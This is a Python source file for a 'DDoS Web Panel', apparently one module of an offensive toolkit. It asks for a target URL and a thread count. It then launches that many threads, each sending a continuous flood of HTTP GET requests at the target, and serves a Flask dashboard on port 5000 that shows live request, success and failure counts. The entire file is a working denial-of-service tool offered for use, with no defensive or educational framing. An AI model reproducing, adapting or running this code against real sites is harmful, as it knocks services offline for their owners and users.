#!/usr/bin/env python3
# DDOS WEB PANEL - Monitoring panel

import threading
import time
import requests
from flask import Flask, jsonify, render_template_string
from core.colors import Colors

app = Flask(__name__)
stats = {"requests": 0, "success": 0, "failed": 0, "running": False}

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>DDoS Panel</title>
    <meta http-equiv="refresh" content="1">
    <style>
        body { font-family: monospace; background: #0a0e1a; color: #00ff88; padding: 20px; }
        h1 { color: #ff4444; }
        .stat { font-size: 24px; margin: 10px; }
        .stat-number { font-size: 48px; color: #00ff88; }
    </style>
</head>
<body>
    <h1>🔥 DDOS MONITOR PANEL</h1>
    <div class="stat">📊 Requests: <span class="stat-number">{{ stats.requests }}</span></div>
    <div class="stat">✅ Success: <span class="stat-number">{{ stats.success }}</span></div>
    <div class="stat">❌ Failed: <span class="stat-number">{{ stats.failed }}</span></div>
    <div class="stat">⚡ Running: {{ stats.running }}</div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, stats=stats)

@app.route('/stats')
def get_stats():
    return jsonify(stats)

def start_flask():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

def attack(url, threads):
    global stats
    def flood():
        while stats["running"]:
            try:
                requests.get(url, timeout=3)
                stats["success"] += 1
            except:
                stats["failed"] += 1
            stats["requests"] += 1
    
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()

class DDoSPanel:
    def __init__(self):
        self.name = "DDoS Web Panel"
    
    def run(self):
        print(f"\n{Colors.CYAN}[*] {self.name}{Colors.END}")
        url = input(f"{Colors.GREEN}Target URL > {Colors.END}")
        threads = int(input(f"{Colors.GREEN}Threads (100) > {Colors.END}") or "100")
        
        print(f"\n{Colors.CYAN}[*] Starting web panel on http://localhost:5000{Colors.END}")
        print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.END}\n")
        
        stats["running"] = True
        threading.Thread(target=start_flask, daemon=True).start()
        time.sleep(2)
        attack(url, threads)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            stats["running"] = False
            print(f"\n{Colors.GREEN}[+] Attack stopped. Total requests: {stats['requests']}{Colors.END}")

if __name__ == "__main__":
    tool = DDoSPanel()
    tool.run()
